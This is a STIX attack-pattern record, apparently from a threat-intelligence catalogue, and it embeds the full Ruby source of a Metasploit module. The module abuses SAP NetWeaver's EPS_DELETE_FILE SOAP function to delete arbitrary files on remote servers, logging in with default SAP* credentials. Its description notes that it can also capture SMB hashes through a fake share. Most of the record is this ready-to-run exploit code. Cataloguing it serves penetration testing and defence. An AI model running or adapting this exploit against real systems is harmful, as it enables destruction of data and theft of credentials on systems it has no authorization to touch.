{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2e9dd155-664d-4420-b296-9d8d3644ee0c",
    "created": "2024-08-14T16:24:51.811388Z",
    "modified": "2024-08-14T16:24:51.811392Z",
    "name": "SAP SOAP EPS_DELETE_FILE File Deletion",
    "description": " This module abuses the SAP NetWeaver EPS_DELETE_FILE function, on the SAP SOAP RFC Service, to delete arbitrary files on the remote file system. The module can also be used to capture SMB hashes by using a fake SMB share as DIRNAME.  'References' => [ [ 'OSVDB', '74780' ]",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/sap/sap_soap_rfc_eps_delete_file.rb",
            "external_id": "sap_soap_rfc_eps_delete_file.rb"
        },
        {
            "source_name": "reference",
            "url": "https://launchpad.support.sap.com/#/notes/1554030"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n##\n# This module is based on, inspired by, or is a port of a plugin available in\n# the Onapsis Bizploit Opensource ERP Penetration Testing framework -\n# http://www.onapsis.com/research-free-solutions.php.\n# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts\n# in producing the Metasploit modules and was happy to share his knowledge and\n# experience - a very cool guy.\n#\n# The following guys from ERP-SCAN deserve credit for their contributions -\n# Alexandr Polyakov, Alexey Sintsov, Alexey Tyurin, Dmitry Chastukhin and\n# Dmitry Evdokimov.\n#\n# I'd also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis\n# who have Beta tested the modules and provided excellent feedback. Some people\n# just seem to enjoy hacking SAP :)\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name' => 'SAP SOAP EPS_DELETE_FILE File Deletion',\n      'Description' => %q{\n          This module abuses the SAP NetWeaver EPS_DELETE_FILE function, on the SAP SOAP\n        RFC Service, to delete arbitrary files on the remote file system. The module can\n        also be used to capture SMB hashes by using a fake SMB share as DIRNAME.\n      },\n      'References' => [\n        [ 'OSVDB', '74780' ],\n        [ 'URL', 'http://dsecrg.com/pages/vul/show.php?id=331' ],\n        [ 'URL', 'https://launchpad.support.sap.com/#/notes/1554030' ]\n      ],\n      'Author' =>\n        [\n          'Alexey Sintsov', # Vulnerability discovery\n          'nmonkee' # Metasploit module\n        ],\n      'License' => MSF_LICENSE\n      )\n\n    register_options([\n      Opt::RPORT(8000),\n      OptString.new('CLIENT', [true, 'SAP Client', '001']),\n      OptString.new('HttpUsername', [true, 'Username', 'SAP*']),\n      OptString.new('HttpPassword', [true, 'Password', '06071992']),\n      OptString.new('DIRNAME', [true, 'Directory Path which contains the file to delete', '/tmp']),\n      OptString.new('FILENAME', [true, 'Filename to delete', 'msf.txt'])\n    ])\n  end\n\n  def run_host(ip)\n    data = '<?xml version=\"1.0\" encoding=\"utf-8\" ?>'\n    data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:soap=\"http://schemas.xmlsoap.org/wsdl/soap/\"  '\n    data << 'xmlns:xsd=\"http://www.w3.org/1999/XMLSchema\"  xmlns:xsi=\"http://www.w3.org/1999/XMLSchema-instance\"  xmlns:m0=\"http://tempuri.org/\"  '\n    data << 'xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\">'\n    data << '<SOAP-ENV:Header/>'\n    data << '<SOAP-ENV:Body>'\n    data << '<EPS_DELETE_FILE xmlns=\"urn:sap-com:document:sap:rfc:functions\">'\n    data << '<DIR_NAME>' + datastore['DIRNAME'] + '</DIR_NAME>'\n    data << '<FILE_NAME>' + datastore['FILENAME'] + '</FILE_NAME>'\n    data << '<IV_LONG_DIR_NAME></IV_LONG_DIR_NAME>'\n    data << '<IV_LONG_FILE_NAME></IV_LONG_FILE_NAME>'\n    data << '</EPS_DELETE_FILE>'\n    data << '</SOAP-ENV:Body>'\n    data << '</SOAP-ENV:Envelope>'\n\n    begin\n      vprint_status(\"#{rhost}:#{rport} - Sending request to delete #{datastore['FILENAME']} at #{datastore['DIRNAME']}\")\n      res = send_request_cgi({\n        'uri' => '/sap/bc/soap/rfc',\n        'method' => 'POST',\n        'data' => data,\n        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),\n        'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],\n        'ctype' => 'text/xml; charset=UTF-8',\n        'headers' => {\n          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',\n        },\n        'vars_get' => {\n          'sap-client' => datastore['CLIENT'],\n          'sap-language' => 'EN'\n        }\n      })\n\n      if res and res.code == 200 and res.body =~ /EPS_DELETE_FILE.Response/ and res.body.include?(datastore['FILENAME']) and res.body.include?(datastore['DIRNAME'])\n        print_good(\"#{rhost}:#{rport} - File #{datastore['FILENAME']} at #{datastore['DIRNAME']} successfully deleted\")\n      elsif res\n        vprint_error(\"#{rhost}:#{rport} - Response code: \" + res.code.to_s)\n        vprint_error(\"#{rhost}:#{rport} - Response message: \" + res.message.to_s)\n        vprint_error(\"#{rhost}:#{rport} - Response body: \" + res.body.to_s) if res.body\n      end\n      rescue ::Rex::ConnectionError\n        print_error(\"#{rhost}:#{rport} - Unable to connect\")\n        return\n      end\n    end\n  end\n",
    "x_mitre_contributors": [
        ""
    ]
}